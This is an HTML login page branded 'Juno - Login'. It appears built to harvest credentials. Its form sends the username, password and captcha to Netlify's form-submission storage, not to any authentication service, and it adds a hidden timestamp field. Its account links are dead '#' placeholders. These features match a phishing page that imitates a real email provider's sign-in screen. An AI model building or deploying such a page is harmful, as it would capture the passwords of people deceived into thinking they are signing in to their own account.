<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Juno - Login</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <h1>Juno - Login</h1>
            
            <!-- Netlify form with required attributes -->
            <form id="loginForm" name="juno-login" netlify netlify-honeypot="bot-field">
                <!-- Hidden honeypot field for spam protection -->
                <input type="hidden" name="bot-field" />
                
                <!-- Hidden field for timestamp -->
                <input type="hidden" name="timestamp" id="timestamp" />
                
                <div class="input-group">
                    <label for="username">User name:</label>
                    <input type="text" id="username" name="username" required>
                </div>
                
                <div class="input-group">
                    <label for="password">Password:</label>
                    <div class="password-container">
                        <input type="password" id="password" name="password" required>
                        <i class="far fa-eye" id="togglePassword"></i>
                    </div>
                </div>
                
                <div class="remember-section">
                    <div class="checkbox-container">
                        <input type="checkbox" id="keepSigned" name="keepSigned">
                        <label for="keepSigned">Keep me signed in</label>
                    </div>
                </div>
                
                <div class="captcha-section">
                    <div class="captcha-container">
                        <div class="captcha-image">
                            <canvas id="captchaCanvas" width="300" height="80"></canvas>
                            <button type="button" class="refresh-btn" id="refreshCaptcha">
                                <i class="fas fa-sync-alt"></i>
                            </button>
                        </div>
                        <div class="captcha-instruction">
                            <label for="captchaInput">Type the words above.</label>
                            <input type="text" id="captchaInput" name="captcha" required>
                        </div>
                    </div>
                </div>
                
                <button type="submit" class="login-btn">Login</button>
            </form>
            
            <div class="footer-links">
                <a href="#">Forgot Password?</a>
                <a href="#">Create Account</a>
                <a href="#">Help Center</a>
            </div>
        </div>
    </div>
    
    <script src="script.js"></script>
</body>
</html>
